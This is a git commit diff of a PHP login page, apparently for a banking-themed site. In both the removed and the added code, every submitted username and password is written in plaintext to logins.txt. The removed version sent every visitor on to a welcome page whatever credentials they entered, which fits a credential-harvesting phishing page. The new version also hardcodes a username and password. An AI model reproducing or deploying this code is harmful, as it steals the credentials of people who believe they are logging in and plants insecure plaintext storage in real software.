9c8a8fbacad910980f734d9415a3a3f348d32634
Carmichael <carmichaelc09@gmail.com>
2023-04-04 22:08:40 -0400

    made changes to login.php

--- src/main/webapp/login.php
+++ src/main/webapp/login.php
@@ -1,26 +1,28 @@
 <?php
-  $isUnderMaintenance = true; // Change to false when the maintenance is over
-  if ($isUnderMaintenance) {
-      echo "Currently unavailable. Please check back later.";
+  // Get the username and password from the form data
+  $username = $_POST["username"];
+  $password = $_POST["password"];
+
+  // Set the path for the logins.txt file
+  $loginsFilePath = "logins.txt";
+
+  // Open the file for appending
+  $file = fopen($loginsFilePath, "a");
+
+  // Write the login information to the file
+  fwrite($file, "Username: $username\nPassword: $password\n\n");
+
+  // Close the file
+  fclose($file);
+
+  // Check if the username and password are correct (you should use a more secure authentication method)
+  if ($username == "myusername" && $password == "mypassword") {
+    // Redirect the user to the dashboard page
+    header("Location: welcome.html");
+    exit(); // Make sure to call exit() after header() to prevent any further code execution
   } else {
-      // Get the username and password from the form data
-      $username = $_POST["username"];
-      $password = $_POST["password"];
-
-      // Set the path for the logins.txt file
-      $loginsFilePath = "/home/ec2-user/bank/logins.txt";
-
-      // Open the file for appending
-      $file = fopen("logins.txt", "a");
-
-      // Write the login information to the file
-      fwrite($file, "Username: $username\nPassword: $password\n\n");
-
-      // Close the file
-      fclose($file);
-
-      // Redirect the user back to the login page
-      header("Location: welcome.html");
+    // If the username and password are incorrect, display an error message
+    echo "Invalid username or password";
   }
 ?>
 
